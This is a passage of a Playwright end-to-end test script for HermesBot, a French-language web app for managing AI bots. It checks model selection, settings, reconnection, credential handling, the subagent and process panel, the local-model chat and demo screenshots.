    const logos = [...document.querySelectorAll('.model-group-tile.has-logo img')]
    return logos.length === 2 && logos.every((logo) => logo.complete && logo.naturalWidth > 0)
  }, null, { timeout: 5_000 })
  const localGroup = page.locator('.model-group', { hasText: 'Local LLM' })
  if (await localGroup.count() !== 1) throw new Error('Les modèles locaux doivent être réunis sous Local LLM.')
  if (await localGroup.locator('.model-group-count').innerText() !== '2') throw new Error('Local LLM doit réunir oMLX et LM Studio.')
  if (await localGroup.locator('.model-group-tile.is-local svg').count() !== 1 || await localGroup.locator('img').count()) throw new Error('Local LLM doit garder son icône neutre.')
  if (await page.locator('.model-group-name', { hasText: /oMLX|LM Studio/ }).count()) throw new Error('Le nom du serveur local ne doit plus être affiché.')
  await kimiGroup.locator('.model-group-head').click()
  await kimiGroup.locator('.model-option[data-model="k3.1-pro"]').waitFor({ state: 'visible', timeout: 3_000 })
  await page.waitForTimeout(400)
  const startTheme = await page.evaluate(() => document.documentElement.dataset.theme)
  await page.evaluate(() => { document.documentElement.dataset.theme = 'light' })
  await page.screenshot({ path: `${SCREENSHOTS}model-picker-light.png` })
  await page.evaluate(() => { document.documentElement.dataset.theme = 'dark' })
  await page.waitForTimeout(600)
  await page.screenshot({ path: `${SCREENSHOTS}model-picker-dark.png` })
  await page.evaluate((theme) => { document.documentElement.dataset.theme = theme }, startTheme)
  await page.getByRole('textbox', { name: 'Rechercher un modèle' }).press('Escape')
  await page.getByRole('button', { name: 'Choisir le modèle' }).click()
  await page.waitForTimeout(400)
  if (!await kimiGroup.evaluate((group) => group.classList.contains('is-open'))) throw new Error('Le pliage doit être mémorisé.')
  await page.getByRole('textbox', { name: 'Rechercher un modèle' }).press('ArrowUp')
  await kimiGroup.locator('.model-group-head').click()
  await page.getByRole('textbox', { name: 'Rechercher un modèle' }).fill('k3.1')
  await kimiGroup.locator('.model-option[data-model="k3.1-pro"]').waitFor({ state: 'visible', timeout: 3_000 })
  await page.getByRole('textbox', { name: 'Rechercher un modèle' }).fill('')
  await page.locator('.model-option[data-model="claude-sonnet-5-5"]').click()
  await page.locator('.model-chip').getByText('Sonnet 5.5').waitFor({ timeout: 5_000 })
  const lastMutation = modelMutations.at(-1)
  if (modelMutations.length !== 2) throw new Error(`session.mutate: ${modelMutations.length} appels au lieu de 2`)
  if (lastMutation?.expected_revision !== 4 || lastMutation?.expected_generation !== 1) throw new Error(`Clôtures inattendues: ${JSON.stringify(lastMutation)}`)
  if (lastMutation?.payload?.model !== 'claude-sonnet-5-5' || lastMutation?.payload?.provider !== 'anthropic' || lastMutation?.payload?.confirm !== 'confirm-test') throw new Error(`Mutation inattendue: ${JSON.stringify(lastMutation)}`)
  if (!lastMutation?.request_id || lastMutation.request_id === modelMutations[0].request_id) throw new Error('La confirmation doit avoir une nouvelle request_id.')

  // Settings: theme, text, send key, then a hidden model leaves the picker and comes back in one click.
  const openSettings = async () => {
    await page.getByRole('button', { name: 'Réglages', exact: true }).click()
    await settingsDialog.waitFor({ timeout: 3_000 })
  }
  const settingsDialog = page.getByRole('dialog', { name: 'Réglages' })
  await openSettings()
  await page.waitForTimeout(350)
  await page.screenshot({ path: `${SCREENSHOTS}settings-general.png` })
  await settingsDialog.getByRole('radio', { name: 'Sombre' }).click()
  await page.waitForFunction(() => document.documentElement.dataset.theme === 'dark')
  await settingsDialog.getByRole('radio', { name: 'Clair' }).click()
  await page.waitForFunction(() => document.documentElement.dataset.theme === 'light')
  await settingsDialog.getByRole('radio', { name: 'Grande' }).click()
  const largeText = await page.locator('.composer textarea').first().evaluate((element) => getComputedStyle(element).fontSize)
  if (largeText !== '16px') throw new Error(`Taille du texte non appliquée : ${largeText}`)
  await settingsDialog.getByRole('radio', { name: 'Normale' }).click()
  await settingsDialog.getByRole('button', { name: 'Conversations' }).click()
  await settingsDialog.getByRole('radio', { name: '⌘ Entrée' }).click()
  await settingsDialog.press('Escape')
  await settingsDialog.waitFor({ state: 'detached', timeout: 3_000 })
  await page.locator('.composer-hint-keys').first().getByText('⌘ Entrée pour envoyer').waitFor({ timeout: 3_000 })
  const promptsBeforeKeys = promptCalls
  const composerField = page.getByRole('textbox', { name: 'Message à Orion' })
  await composerField.fill('une ligne')
  await composerField.press('Enter')
  if (promptCalls !== promptsBeforeKeys || !(await composerField.inputValue()).includes('\n')) throw new Error('Avec ⌘ Entrée, Entrée doit aller à la ligne sans envoyer.')
  await composerField.fill('')
  await openSettings()
  await settingsDialog.getByRole('button', { name: 'Conversations' }).click()
  await settingsDialog.getByRole('radio', { name: 'Entrée', exact: true }).click()
  await settingsDialog.getByRole('button', { name: 'Modèles' }).click()
  const settingsSearch = settingsDialog.getByRole('textbox', { name: 'Rechercher dans les modèles' })
  await settingsSearch.fill('kimi k3')
  await settingsDialog.locator('.settings-model[data-model="kimi-k3"] input').uncheck()
  await settingsSearch.fill('sonnet')
  await settingsDialog.locator('.settings-model[data-model="claude-sonnet-5-5"] input').uncheck()
  await settingsSearch.fill('')
  await settingsDialog.press('Escape')
  await settingsDialog.waitFor({ state: 'detached', timeout: 3_000 })
  await page.getByRole('button', { name: 'Choisir le modèle' }).click()
  await page.locator('.model-option[data-model="claude-sonnet-5-5"]').waitFor({ timeout: 5_000 })
  await page.getByRole('textbox', { name: 'Rechercher un modèle' }).fill('kimi')
  await page.locator('.model-option[data-model="kimi-for-coding"]').waitFor({ timeout: 3_000 })
  if (await page.locator('.model-option[data-model="kimi-k3"]').count()) throw new Error('Un modèle masqué reste proposé.')
  await page.getByRole('button', { name: 'Gérer les modèles' }).click()
  await settingsDialog.waitFor({ timeout: 3_000 })
  await settingsDialog.locator('.settings-model-toggle', { hasText: 'Anthropic' }).click()
  await settingsDialog.locator('.settings-model[data-model="claude-fable-5-2"]').waitFor({ timeout: 3_000 })
  await page.waitForTimeout(350)
  await page.screenshot({ path: `${SCREENSHOTS}settings-models.png` })
  await page.evaluate(() => { document.documentElement.dataset.theme = 'dark' })
  await page.waitForTimeout(400)
  await page.screenshot({ path: `${SCREENSHOTS}settings-models-dark.png` })
  await page.evaluate(() => { document.documentElement.dataset.theme = 'light' })
  await settingsDialog.getByRole('button', { name: 'Tout afficher' }).click()
  const savedSettings = await page.evaluate(() => JSON.parse(localStorage.getItem('hermesbot-settings')))
  if (savedSettings.hiddenModels.length !== 0 || savedSettings.sendKey !== 'enter' || savedSettings.textSize !== 'normal') throw new Error(`Réglages mal enregistrés : ${JSON.stringify(savedSettings)}`)
  await settingsDialog.getByRole('button', { name: 'Fermer les réglages' }).click()
  await settingsDialog.waitFor({ state: 'detached', timeout: 3_000 })

  // Caveman mode: one switch for every bot. The note is read with the turn, after the mode instruction;
  // the stored text stays the user's, and an approved mail still goes out with nothing added.
  const setCaveman = async (on) => {
    await openSettings()
    await settingsDialog.getByRole('button', { name: 'Conversations' }).click()
    const cavemanSwitch = settingsDialog.getByRole('switch', { name: /Mode caveman/ })
    if (await cavemanSwitch.isChecked() === on) throw new Error(`Le mode caveman devrait être ${on ? 'coupé' : 'actif'} avant le clic.`)
    await cavemanSwitch.setChecked(on)
    if (on) {
      await page.waitForTimeout(350)
      await page.screenshot({ path: `${SCREENSHOTS}settings-caveman.png` })
    }
    await settingsDialog.getByRole('button', { name: 'Fermer les réglages' }).click()
    await settingsDialog.waitFor({ state: 'detached', timeout: 3_000 })
  }
  const CAVEMAN_NOTE = '[HermesBot style: caveman. For this turn only,'
  await setCaveman(true)
  await sendInMode('Test caveman')
  if (!lastApiText?.startsWith(`Test caveman\n\n${CAVEMAN_NOTE}`) || !lastApiText.includes('messages to others stay normal')) throw new Error(`api_text caveman : ${lastApiText}`)
  if (await page.locator('.messages-scroll').getByText('HermesBot style').count()) throw new Error('La note caveman est visible.')
  await modeRadio('BRAIN').click()
  await sendInMode('Test caveman brain')
  const brainAt = lastApiText?.indexOf('[HermesBot mode: BRAIN.') ?? -1
  if (brainAt < 0 || lastApiText.indexOf(CAVEMAN_NOTE) < brainAt) throw new Error(`La note caveman doit suivre la consigne du mode : ${lastApiText}`)
  await modeRadio('EXEC').click()
  await askMail('m3')
  await card.waitFor({ timeout: 5_000 })
  if (!lastApiText?.includes(CAVEMAN_NOTE)) throw new Error('La demande de mail part du champ de saisie : elle porte la note caveman.')
  const promptsBeforeCavemanMail = promptCalls
  await card.getByRole('button', { name: 'Envoyer' }).click()
  for (let attempt = 0; attempt < 40 && promptCalls === promptsBeforeCavemanMail; attempt += 1) await delay(50)
  if (promptCalls !== promptsBeforeCavemanMail + 1 || !lastPromptText.includes('Id: m3')) throw new Error('Le mail approuvé en mode caveman doit lancer un seul tour.')
  if (lastApiText !== undefined) throw new Error(`Un mail validé ne doit pas porter la note caveman : ${lastApiText}`)
  await card.waitFor({ state: 'detached', timeout: 3_000 })
  await page.locator('.composer-send[aria-label="Envoyer"]').waitFor({ state: 'attached', timeout: 3_000 })
  await delay(500) // the simulated turn ends: the next send would be ignored while it runs
  await setCaveman(false)
  await sendInMode('Test sans caveman')
  if (lastApiText !== undefined) throw new Error(`Mode caveman coupé : rien ne doit être ajouté : ${lastApiText}`)

  // A real user gesture (wheel up) detaches the thread; a programmatic scroll would not.
  const scrollBox = await page.locator('.messages-scroll').boundingBox()
  await page.mouse.move(scrollBox.x + scrollBox.width / 2, scrollBox.y + scrollBox.height / 2)
  await page.mouse.wheel(0, -40_000)
  await page.waitForFunction(() => document.querySelector('.messages-scroll').scrollTop < 5, null, { timeout: 5_000 })
  await delay(200)
  const scrolledTo = await page.locator('.messages-scroll').evaluate((element) => element.scrollTop)
  await page.getByRole('textbox', { name: 'Message à Orion' }).fill('Test pendant lecture')
  await page.getByRole('textbox', { name: 'Message à Orion' }).press('Enter')
  await delay(600)
  const scrollTop = await page.locator('.messages-scroll').evaluate((element) => element.scrollTop)
  if (scrollTop !== scrolledTo) throw new Error(`Le scroll a été déplacé pendant la réponse: ${scrolledTo} → ${scrollTop}`)
  await page.locator('.jump-latest').click()
  await delay(600)
  const jumpedScrollTop = await page.locator('.messages-scroll').evaluate((element) => element.scrollTop)
  if (jumpedScrollTop === 0) throw new Error('Le bouton Nouveaux messages ne descend pas.')

  // Abrupt gateway cut (code 1006): the server must survive, then sending must resume.
  for (const client of wss.clients) client.terminate()
  await delay(500)
  if (!(await fetch('http://127.0.0.1:4332/api/health')).ok) throw new Error('Le serveur est tombé sur une fermeture 1006.')
  const promptsBeforeReconnect = promptCalls
  await page.getByRole('textbox', { name: 'Message à Orion' }).fill('Après coupure')
  await page.getByRole('textbox', { name: 'Message à Orion' }).press('Enter')
  await page.getByText('Après coupure').first().waitFor({ timeout: 5_000 })
  for (let attempt = 0; attempt < 30 && promptCalls === promptsBeforeReconnect; attempt += 1) await delay(100)
  if (promptCalls === promptsBeforeReconnect) throw new Error('Envoi perdu après reconnexion.')
  await delay(400)

  // Reconnect button: visible status, recovery without reloading the page, open chat resubscribed.
  const refresh = page.getByRole('button', { name: 'Reconnecter Hermes' })
  const connection = page.locator('.connection-label')
  for (const client of wss.clients) client.terminate()
  await connection.getByText('Hermes déconnecté').waitFor({ timeout: 5_000 })
  const resumesBeforeRefresh = sessionResumeCalls
  await refresh.click()
  await connection.getByText('Hermes connecté').waitFor({ timeout: 5_000 })
  for (let attempt = 0; attempt < 30 && sessionResumeCalls === resumesBeforeRefresh; attempt += 1) await delay(100)
  if (sessionResumeCalls === resumesBeforeRefresh) throw new Error('Le chat ouvert n’a pas été réabonné après reconnexion.')
  await refresh.click() // socket still open: must be replaced, not doubled
  await delay(500)
  await connection.getByText('Hermes connecté').waitFor({ timeout: 5_000 })
  if (wss.clients.size !== 1) throw new Error(`Sockets ouverts après reconnexion : ${wss.clients.size} au lieu de 1.`)
  for (const client of wss.clients) send(client, event('chat-orion', 'message.complete', { turn_id: 'turn-retour', text: 'Reçu après reconnexion.', status: 'complete' }))
  await page.locator('.message-assistant').getByText('Reçu après reconnexion.').waitFor({ timeout: 3_000 })

  // Unreachable gateway: clear message, then recovery on the next click.
  forcedAuthStatus = 503
  await refresh.click()
  await page.locator('.toast').getByText('Hermes ne répond pas').waitFor({ timeout: 5_000 })
  await connection.getByText('Hermes déconnecté').waitFor({ timeout: 2_000 })
  await delay(400)
  await page.screenshot({ path: `${SCREENSHOTS}hermes-disconnected.png` })
  forcedAuthStatus = 0
  await refresh.click()
  await connection.getByText('Hermes connecté').waitFor({ timeout: 5_000 })
  if (await page.locator('.toast').count()) throw new Error('Le message d’erreur reste affiché après reconnexion.')

  // Credentials kept server-side, never in the browser.
  if (JSON.parse(readFileSync(SAVED_LOGIN_FILE, 'utf8')).username !== 'test') throw new Error('Identifiants non enregistrés.')
  if (await page.evaluate(() => JSON.stringify({ ...localStorage, ...sessionStorage, cookie: document.cookie }).includes('"password"'))) throw new Error('Mot de passe présent dans le navigateur.')

  // Another local process, even with the right Origin, gets nothing without a session cookie.
  const loginsBeforeForged = loginCalls
  const forged = await fetch('http://127.0.0.1:4332/api/auth/restore', { method: 'POST', headers: { Origin: 'http://127.0.0.1:4332' } })
  await forged.arrayBuffer()
  if (forged.status !== 404 || forged.headers.get('set-cookie') || loginCalls !== loginsBeforeForged) throw new Error(`Restauration sans cookie acceptée : HTTP ${forged.status}.`)

  // Expired Hermes session: silent reconnection with the stored credentials.
  const loginsBeforeExpiry = loginCalls
  expiredBefore = cookieCounter
  await refresh.click()
  await delay(300)
  await connection.getByText('Hermes connecté').waitFor({ timeout: 5_000 })
  if (loginCalls !== loginsBeforeExpiry + 1) throw new Error(`Reconnexion silencieuse : ${loginCalls - loginsBeforeExpiry} connexions au lieu de 1.`)
  if (await page.locator('.login-card').count()) throw new Error('Écran de connexion affiché malgré les identifiants gardés.')

  // Password changed: credentials forgotten, back to the screen, then the same bot resumes.
  expiredBefore = cookieCounter
  loginRefused = true
  await refresh.click()
  await page.locator('.login-card').waitFor({ timeout: 5_000 })
  await page.getByText('Identifiants enregistrés refusés').waitFor({ timeout: 2_000 })
  if (existsSync(SAVED_LOGIN_FILE)) throw new Error('Des identifiants refusés doivent être oubliés.')
  loginRefused = false
  await page.getByLabel('Identifiant Hermes').fill('test')
  await page.getByLabel('Mot de passe').fill('test')
  await page.getByRole('button', { name: 'Ouvrir mes bots' }).click()
  await page.locator('[data-bot=orion].is-selected').waitFor({ timeout: 10_000 })
  await connection.getByText('Hermes connecté').waitFor({ timeout: 5_000 })
  if (await page.locator('.toast').count()) throw new Error('Le message de session expirée reste affiché après connexion.')

  // Ordering: sections by group, single list by activity with the most recent bot first.
  const rosterOrder = () => page.locator('.bot-row:not([data-bot^="local:"])').evaluateAll((rows) => rows.map((row) => row.dataset.bot).join())
  await page.locator('.section-heading').first().waitFor({ timeout: 3_000 })
  if (await rosterOrder() !== 'nova,orion') throw new Error(`Ordre par groupes : ${await rosterOrder()}`)
  await page.getByRole('button', { name: 'Activité', exact: true }).click()
  await page.locator('.section-heading').first().waitFor({ state: 'detached', timeout: 3_000 })
  if (await rosterOrder() !== 'orion,nova') throw new Error(`Ordre par activité : ${await rosterOrder()}`)
  await page.getByRole('button', { name: 'Groupes', exact: true }).click()
  await page.locator('.section-heading').first().waitFor({ timeout: 3_000 })
  if (await rosterOrder() !== 'nova,orion') throw new Error(`Retour aux groupes : ${await rosterOrder()}`)

  // Standing by: no turn, but a subagent and background processes still running. Profile-wide first
  // (`subagent.roster`), then the open conversation's own reads (`process.list`, `subagent.list`) and events.
  await page.locator('[data-bot=nova]').click()
  await page.locator('[data-bot=nova].is-selected').waitFor({ timeout: 3_000 })
  backgroundCalls.length = 0
  subagentRosterByProfile.orion = [{ session_id: 'chat-orion', subagents: 1, background: 1 }, { session_id: 'cron-orion', subagents: 0, background: 1 }]
  liveStatusByProfile.orion = 'working'
  await page.locator('[data-bot=orion] .bot-row-status.is-working').waitFor({ timeout: 9_000 })
  delete liveStatusByProfile.orion
  // The turn's end brings the read forward: no need to wait for the 15 s round.
  await page.locator('[data-bot=orion] .bot-row-status.is-standby').getByText('En veille').waitFor({ timeout: 9_000 })
  const standbyTitle = await page.locator('[data-bot=orion]').getAttribute('title')
  if (standbyTitle !== '1 sous-agent · 2 processus en arrière-plan') throw new Error(`Survol du bot en veille : ${standbyTitle}`)
  await page.locator('[data-bot=orion] .live-avatar.is-standby').waitFor({ timeout: 2_000 })
  if (await page.locator('[data-bot=orion] img.live-avatar-motion').count()) throw new Error('Un bot en veille ne doit pas être animé.')
  await page.locator('.working-strip').getByText('Tous les bots sont disponibles').waitFor({ timeout: 2_000 })
  const rosterReads = backgroundCalls.filter((call) => call.method === 'subagent.roster')
  if (!rosterReads.some((call) => call.params.profile === 'orion') || rosterReads.some((call) => Object.keys(call.params).join() !== 'profile')) throw new Error(`subagent.roster : ${JSON.stringify(rosterReads)}`)
  // Working keeps the priority over standing by.
  liveStatusByProfile.orion = 'working'
  await page.locator('[data-bot=orion] .bot-row-status.is-working').waitFor({ timeout: 9_000 })
  delete liveStatusByProfile.orion
  await page.locator('[data-bot=orion] .bot-row-status.is-standby').waitFor({ timeout: 9_000 })

  processListBySession['chat-orion'] = [
    { session_id: 'proc_dev', command: 'npm run dev', status: 'running', started_epoch: Date.now() / 1000 - 300 },
    { session_id: 'proc_old', command: 'ls', status: 'exited', exit_code: 0 },
  ]
  subagentListBySession['chat-orion'] = [{ subagent_id: 'sa-offres', parent_id: null, depth: 0, goal: 'Comparer les offres d’hébergement', delegation_id: 'd-1', model: 'claude-sonnet-5-5', started_at: Date.now() / 1000 - 75, status: 'running', tool_count: 3, last_tool: 'web_search', accepting_steer: true }]
  await page.locator('[data-bot=orion]').click()
  await page.locator('[data-bot=orion].is-selected').waitFor({ timeout: 3_000 })
  await page.locator('.chat-identity.is-standby .chat-status').getByText('En veille').waitFor({ timeout: 5_000 })
  const panel = page.locator('.subagents-panel')
  await panel.getByText('Comparer les offres d’hébergement').waitFor({ timeout: 6_000 })
  await panel.locator('.subagents-counts').getByText('1 en cours').waitFor({ timeout: 2_000 })
  await panel.locator('.subagents-counts').getByText('1 processus en arrière-plan').waitFor({ timeout: 2_000 })
  await panel.getByText('Dernier outil : Cherche sur le web').waitFor({ timeout: 2_000 })
  for (const call of backgroundCalls.filter((item) => item.method === 'process.list' || item.method === 'subagent.list')) {
    if (JSON.stringify(call.params) !== JSON.stringify({ profile: 'orion', session_id: 'chat-orion' })) throw new Error(`${call.method} : ${JSON.stringify(call.params)}`)
  }
  if (await page.locator('.subagents-panel').getByText('npm run dev').count()) throw new Error('La commande d’un processus est affichée.')
  // Events of a child delegated in the background, as the gateway relays them.
  const delegated = { goal: 'Résumer les avis clients', task_count: 2, task_index: 1, subagent_id: 'sa-avis', depth: 0, model: 'claude-sonnet-5-5', tool_count: 0 }
  broadcast(event('chat-orion', 'subagent.spawn_requested', delegated))
  broadcast(event('chat-orion', 'subagent.start', delegated))
  broadcast(event('chat-orion', 'subagent.tool', { ...delegated, tool_name: 'read_file', tool_preview: 'avis-secret.md', text: 'avis-secret.md', tool_count: 1 }))
  await panel.getByText('Résumer les avis clients').waitFor({ timeout: 3_000 })
  await panel.locator('.subagents-counts').getByText('2 en cours').waitFor({ timeout: 2_000 })
  if (await panel.getByText('avis-secret.md').count()) throw new Error('Les arguments d’un outil sont affichés.')
  broadcast(event('chat-orion', 'subagent.complete', { ...delegated, status: 'completed', summary: 'Les clients aiment la vitesse, moins le prix.', duration_seconds: 64, tool_count: 5, output_tail: [{ tool: 'read_file', preview: '120 avis lus', is_error: false }] }))
  await panel.getByText('Les clients aiment la vitesse, moins le prix.').waitFor({ timeout: 3_000 })
  await panel.locator('.subagents-counts').getByText('1 fini').waitFor({ timeout: 2_000 })
  await panel.locator('.subagent-row.is-completed').getByText('1 min 04 s').waitFor({ timeout: 2_000 })
  const headerTitle = await page.locator('.chat-identity').getAttribute('title')
  if (headerTitle !== '1 sous-agent · 2 processus en arrière-plan') throw new Error(`Survol de l’en-tête : ${headerTitle}`)
  await delay(300)
  await page.screenshot({ path: `${SCREENSHOTS}subagents-panel.png` })
  // On click: the end of the live transcript; a finished child shows the last tool results it gave.
  subagentTailById['sa-offres'] = 'Lecture des offres.\nComparaison faite : l’offre B coûte 20 % de moins.'
  await panel.locator('.subagent-row', { hasText: 'Comparer les offres' }).locator('.subagent-main').click()
  await panel.locator('.subagent-tail pre').getByText('l’offre B coûte 20 % de moins').waitFor({ timeout: 3_000 })
  const tailCall = backgroundCalls.filter((item) => item.method === 'subagent.tail').at(-1)
  if (JSON.stringify(tailCall?.params) !== JSON.stringify({ profile: 'orion', session_id: 'chat-orion', subagent_id: 'sa-offres' })) throw new Error(`subagent.tail : ${JSON.stringify(tailCall?.params)}`)
  await panel.locator('.subagent-row', { hasText: 'Résumer les avis' }).locator('.subagent-main').click()
  await panel.locator('.subagent-row', { hasText: 'Résumer les avis' }).getByText('Derniers résultats d’outils').waitFor({ timeout: 3_000 })
  await panel.locator('.subagent-row', { hasText: 'Résumer les avis' }).getByText('120 avis lus').waitFor({ timeout: 2_000 })
  await page.screenshot({ path: `${SCREENSHOTS}subagents-tail.png` })
  // Everything stops: back to idle, and the open conversation is no longer read.
  delete subagentRosterByProfile.orion
  processListBySession['chat-orion'] = [{ session_id: 'proc_dev', command: 'npm run dev', status: 'exited', exit_code: 0 }]
  subagentListBySession['chat-orion'] = []
  await page.locator('.chat-identity.is-idle').waitFor({ timeout: 25_000 })
  await page.locator('[data-bot=orion] .bot-row-status.is-standby').waitFor({ state: 'detached', timeout: 2_000 })
  await panel.locator('.subagent-row.is-ended').getByText('Comparer les offres d’hébergement').waitFor({ timeout: 2_000 })
  const chatReads = () => backgroundCalls.filter((item) => item.method === 'process.list').length
  const readsAtRest = chatReads()
  await delay(6_000)
  if (chatReads() !== readsAtRest) throw new Error('process.list est encore lu alors que plus rien ne tourne.')
  delete processListBySession['chat-orion']
  delete subagentListBySession['chat-orion']

  const stoppedChild = new Promise((resolve) => child.once('exit', resolve))
  child.kill('SIGTERM')
  await stoppedChild
  child = spawn(process.execPath, ['server/index.mjs'], {
    cwd: new URL('..', import.meta.url),
    env: {
      ...process.env,
      NODE_ENV: 'development', PORT: '4332', HERMES_ORIGIN: 'http://127.0.0.1:9121', OLLAMA_ORIGIN: 'http://127.0.0.1:9121',
      BROWSER_VAULT_PORT: '4333', HERMESBOT_VAULT_TOKEN_FILE: BROWSER_VAULT_TOKEN,
      BROWSER_TOUR_COMMAND: BROWSER_TOUR_FIXTURE, BROWSER_TOUR_OWNER_FILE,
      NODE_OPTIONS: `--require ${new URL('persistence-hook.cjs', import.meta.url).pathname}`,
      HERMESBOT_TEST_SESSION_FILE: SESSION_FILE,
      ...TEST_ENV,
    },
    stdio: ['ignore', 'pipe', 'pipe'],
  })
  for (let attempt = 0; attempt < 50; attempt += 1) {
    try { if ((await fetch('http://127.0.0.1:4332/api/health')).ok) break } catch { /* server not ready */ }
    await delay(100)
  }
  await page.reload({ waitUntil: 'domcontentloaded' })
  await page.locator('[data-bot=nova]').waitFor({ timeout: 15_000 })
  if (await page.locator('.login-card').count()) throw new Error('La session n’a pas été restaurée après redémarrage.')
  const persistedBrowser = await vaultCall('list')
  if (persistedBrowser.body.entries?.[0]?.identifier !== 'steam-test' || persistedBrowser.raw.includes(BROWSER_SECRET)) throw new Error('Le coffre CDP ne survit pas au redémarrage.')

  // Owner of the shared Chrome: the route and the roster mark it as working, even without a Hermes turn.
  if ((await fetch('http://127.0.0.1:4332/api/browser-turn')).status !== 401) throw new Error('Le propriétaire du Chrome est lisible sans session.')
  writeFileSync(BROWSER_TOUR_OWNER_FILE, 'orion')
  const browserTurn = await page.evaluate(async () => (await fetch('/api/browser-turn')).json())
  if (browserTurn.owner !== 'orion') throw new Error('Le serveur ne lit pas le propriétaire du Chrome partagé.')
  await page.reload({ waitUntil: 'domcontentloaded' })
  await page.locator('[data-bot=orion] .bot-row-status.is-working').waitFor({ timeout: 15_000 })
  await page.locator('[data-bot=orion]').getByText('Pilote le Chrome partagé').waitFor()
  rmSync(BROWSER_TOUR_OWNER_FILE, { force: true })

  // Isolated local chat: installed model only, no tools, no request to Hermes.
  if ((await fetch('http://127.0.0.1:4332/api/local-chat', { method: 'POST', headers: { Origin: 'http://127.0.0.1:4332', 'Content-Type': 'application/json' }, body: '{"messages":[{"role":"user","content":"x"}]}' })).status !== 401) throw new Error('/api/local-chat répond sans session.')
  await page.locator('[data-bot="local:ollama"]').click()
  const localBox = page.getByRole('textbox', { name: 'Message à Modèle local' })
  await localBox.waitFor({ timeout: 3_000 })
  if (await page.getByRole('button', { name: 'Ajouter des fichiers' }).count()) throw new Error('Le chat local ne doit pas accepter de fichiers.')
  if (await page.getByRole('radio', { name: 'BRAIN', exact: true }).count()) throw new Error('Le chat local ne doit pas avoir de modes.')
  if (await page.locator('.details-panel').count()) throw new Error('Pas de panneau de bot pour le chat local.')
  const promptsBeforeLocal = promptCalls
  await localBox.fill('Bonjour local')
  await localBox.press('Enter')
  await page.locator('.local-chat .message-assistant').getByText('Réponse du modèle local.').waitFor({ timeout: 5_000 })
  if (await page.locator('.local-chat').getByText('je réfléchis').count()) throw new Error('Le raisonnement du modèle est affiché.')
  const localRequest = localChatRequests.at(-1)
  if (localRequest.model !== 'modele-local:7b' || 'tools' in localRequest || localRequest.messages.length !== 1 || localRequest.messages[0].content !== 'Bonjour local') throw new Error(`Requête locale : ${JSON.stringify(localRequest)}`)
  if (promptCalls !== promptsBeforeLocal) throw new Error('Le chat local a lancé un tour Hermes.')
  await page.screenshot({ path: `${SCREENSHOTS}local-chat.png` })
  const smuggled = await page.evaluate(async () => (await fetch('/api/local-chat', { method: 'POST', credentials: 'same-origin', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ model: 'autre-local:1b', tools: [{ type: 'function' }], messages: [{ role: 'user', content: 'x', tools: [1] }] }) })).text())
  const smuggledRequest = localChatRequests.at(-1)
  if (!smuggled || smuggledRequest.model !== 'autre-local:1b' || 'tools' in smuggledRequest || 'tools' in smuggledRequest.messages[0]) throw new Error('Le serveur a laissé passer autre chose que les messages.')
  const requestsBeforeUnknown = localChatRequests.length
  if (await page.evaluate(async () => (await fetch('/api/local-chat', { method: 'POST', credentials: 'same-origin', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ model: 'pas-installe', messages: [{ role: 'user', content: 'x' }] }) })).status) !== 404 || localChatRequests.length !== requestsBeforeUnknown) throw new Error('Un modèle non installé a été demandé à Ollama.')
  if (await page.evaluate(async () => (await fetch('/api/local-chat', { method: 'POST', credentials: 'same-origin', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ messages: [{ role: 'system', content: 'x' }] }) })).status) !== 400) throw new Error('Rôle system accepté.')
  // Switching to another bot keeps the local conversation.
  await page.locator('[data-bot=nova]').click()
  await page.locator('[data-bot=nova].is-selected').waitFor({ timeout: 3_000 })
  await page.getByRole('textbox', { name: 'Message à Nova' }).waitFor({ timeout: 3_000 })
  await page.locator('[data-bot="local:ollama"]').click()
  await page.locator('.local-chat .message-assistant').getByText('Réponse du modèle local.').waitFor({ timeout: 2_000 })
  // Missing model: clear message, no crash.
  localModelMissing = true
  await localBox.fill('Encore')
  await localBox.press('Enter')
  await page.locator('.toast').getByText('pas encore installé').waitFor({ timeout: 5_000 })
  localModelMissing = false
  await page.locator('.toast button').click()
  await page.getByRole('button', { name: 'Effacer la conversation locale' }).click()
  if (await page.locator('.local-chat .message-assistant').count()) throw new Error('Conversation locale non effacée.')
  await page.locator('[data-bot=nova]').click()

  // A truly empty list keeps its message once loading is done.
  emptyRoster = true
  await page.reload({ waitUntil: 'domcontentloaded' })
  await page.getByText('Aucun bot à afficher.').waitFor({ timeout: 15_000 })
  emptyRoster = false

  // Launch with an expired Hermes session: no login screen.
  expiredBefore = cookieCounter
  await page.reload({ waitUntil: 'domcontentloaded' })
  await page.locator('[data-bot=nova]').waitFor({ timeout: 15_000 })
  if (await page.locator('.login-card').count()) throw new Error('Écran de connexion au lancement malgré les identifiants gardés.')

  // Signing out forgets the credentials; a login without the checkbox stores nothing.
  page.once('dialog', (dialog) => dialog.accept())
  await page.getByRole('button', { name: 'Se déconnecter' }).click()
  await page.locator('.login-card').waitFor({ timeout: 10_000 })
  if (existsSync(SAVED_LOGIN_FILE) || logoutCalls !== 1) throw new Error('La déconnexion doit oublier les identifiants.')
  await page.getByLabel('Rester connecté sur ce Mac').uncheck()
  await page.getByLabel('Identifiant Hermes').fill('test')
  await page.getByLabel('Mot de passe').fill('test')
  await page.getByRole('button', { name: 'Ouvrir mes bots' }).click()
  await page.locator('[data-bot=nova]').waitFor({ timeout: 15_000 })
  if (existsSync(SAVED_LOGIN_FILE)) throw new Error('Case décochée : rien ne doit être enregistré.')

  // Demo mode: several states at once (working, done, waiting), light and dark captures.
  await page.goto('http://127.0.0.1:4332/?demo=1', { waitUntil: 'domcontentloaded' })
  await page.locator('.working-strip.has-work').waitFor({ timeout: 10_000 })
  await page.locator('[data-bot=orion] .bot-row-status.is-working').waitFor()
  await page.locator('[data-bot=orion] img.live-avatar-motion').waitFor()
  await page.locator('.section-heading', { hasText: 'Atelier' }).first().waitFor({ timeout: 3_000 })
  await page.getByText('Fais-moi un point simple.').waitFor({ timeout: 3_000 })
  await delay(900)
  await page.screenshot({ path: `${SCREENSHOTS}demo-glass-light.png` })
  await page.getByRole('button', { name: 'Activité', exact: true }).click()
  await page.locator('.section-heading').first().waitFor({ state: 'detached', timeout: 3_000 })
  await delay(300)
  await page.screenshot({ path: `${SCREENSHOTS}demo-activity.png` })
  // English interface: same demo, English system.
  // Twice the pixel density: this capture is the screenshot of the README (docs/screenshot.png).
  const english = await browser.newPage({ viewport: { width: 1280, height: 800 }, locale: 'en-US', deviceScaleFactor: 2 })
